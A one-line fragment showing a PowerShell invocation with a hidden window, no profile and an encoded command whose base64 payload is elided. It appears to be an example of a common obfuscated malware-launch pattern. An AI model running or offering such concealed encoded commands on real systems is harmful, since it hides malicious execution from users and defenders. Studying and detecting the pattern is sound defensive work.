powershell.exe -nop -w hidden -EncodedCommand JABjA...AAAA==
